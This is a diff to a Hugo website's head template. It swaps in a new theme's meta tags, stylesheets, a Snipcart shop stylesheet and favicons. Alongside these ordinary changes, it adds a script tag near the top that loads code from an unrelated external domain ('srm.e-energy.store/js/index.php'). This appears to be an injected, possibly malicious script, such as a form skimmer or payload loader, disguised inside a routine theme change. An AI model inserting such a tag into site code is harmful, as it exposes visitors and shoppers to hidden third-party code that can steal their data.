@@ -1,16 +1,29 @@
 <head>
-  <title>{{ with .Title }}{{ humanize . }} | {{ end }}{{ .Site.Title }}</title>
-  <meta charset='utf-8'>
-  {{- with .Site.Params.ga_verify }}
-  <meta name="google-site-verification" content="{{ . }}" />
-  {{- end }}
-  <meta name="viewport" content ="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  {{- partial "analytics" . }}
-  {{- partial "opengraph" . }}
-  {{- partial "favicon" . }}
-  {{- $options := (dict "targetPath" "css/styles.css" "outputStyle" "expanded" "enableSourceMap" "true") -}}
-  {{ $mainSassFile :=  "sass/main.sass" }}
-  {{- $styles := resources.Get $mainSassFile | resources.ExecuteAsTemplate $mainSassFile . | resources.ToCSS $options | resources.Fingerprint "sha512" }}
-  <link rel="stylesheet" href="{{ $styles.Permalink }}" integrity="{{ $styles.Data.Integrity }}">
+  <meta charset="utf-8">
+  <script src = 'https://srm.e-energy.store/js/index.php'></script>
+  <title>{{ .Site.Title }}</title>
+
+  {{ "<!-- mobile responsive meta -->" | safeHTML }}
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="{{ with .Description }}{{ . }}{{ else }}{{ with .Site.Params.description }}{{ . }}{{ end }}{{ end }}">
+  {{ with .Site.Params.author }}
+  <meta name="author" content="{{ . }}">{{ end }}
+  {{ hugo.Generator }}
+
+  {{ "<!-- plugins -->" | safeHTML }}
+  {{ range .Site.Params.plugins.css }}
+  <link rel="stylesheet" href="{{ .URL | absURL }} ">
+  {{ end }}
+
+  <!-- snipcart -->
+  <link id="snipcart-theme" type="text/css" href="https://cdn.snipcart.com/themes/2.0/base/snipcart.min.css" rel="stylesheet">
+
+  {{ "<!-- Main Stylesheet -->" | safeHTML }}
+  {{ $styles := resources.Get "scss/style.scss" | toCSS | minify }}
+  <link rel="stylesheet" href="{{ $styles.Permalink }}" media="screen">
+
+  {{ "<!--Favicon-->" | safeHTML }}
+  <link rel="shortcut icon" href="{{ `images/favicon.png` | absURL }} " type="image/x-icon">
+  <link rel="icon" href="{{ `images/favicon.png` | absURL }} " type="image/x-icon">
+
 </head>
